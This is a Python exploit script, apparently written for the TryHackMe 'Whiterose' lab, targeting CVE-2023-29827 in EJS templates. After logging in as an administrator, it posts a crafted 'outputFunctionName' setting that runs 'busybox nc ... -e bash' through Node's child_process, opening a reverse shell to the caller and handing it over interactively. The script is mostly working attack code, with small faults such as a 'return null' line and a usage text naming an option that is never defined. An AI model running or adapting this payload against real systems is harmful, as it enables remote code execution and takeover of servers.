import argparse
import requests
import urllib.parse 
from pwn import *

def exploit(ip, port, adminPass):
    revshell = listen(port)
    data = {
        "name": "ds",
        "password": "wd",
        "settings[view options][outputFunctionName]": f"x;process.mainModule.require('child_process').execSync('busybox nc {ip} {port} -e bash');s"
    }
    try:
        session = getSession(adminPass)
        encoded_data = urllib.parse.urlencode(data)
        req = session.post("http://admin.cyprusbank.thm/settings", data=data)

       
        revshell.wait_for_connection()
        revshell.interactive()
    except Exception as e:
        print("[-] Something went wrong")
        print(e)

def getSession(password):
    url = "http://admin.cyprusbank.thm/login"
    session = requests.Session()

    login_page = session.get(url)
    data = {
        "username": "Gayle Bev",
        "password": password, 
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Referer": url,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
    }

    req = session.post(url, data=data, headers=headers)

    req = session.post(url, data=data, headers=headers)
    if req.status_code == 200:
        return session
    else:
        print("[-] Can't log in")
        return null

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2023-29827 PoC For Whiterose TryHackMe room",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        usage='''
            exploit.py -i [YOUR IP] -p [port] -c [cookies]
            exploit.py -i 10.10.10.10 -p 1337 -c "session=nope"
        '''
    )

    parser.add_argument('-i', '--ip', help="IP address for reverse shell")
    parser.add_argument('-p', '--port', help="Your listener port")
    parser.add_argument('-a', '--admin', help="Password for administrator user (You need to find it in the site)")

    args = parser.parse_args()
    if args.admin and args.ip and args.port:
        exploit(args.ip, args.port, args.admin)
    else:
        print("One or more parameters are missing")
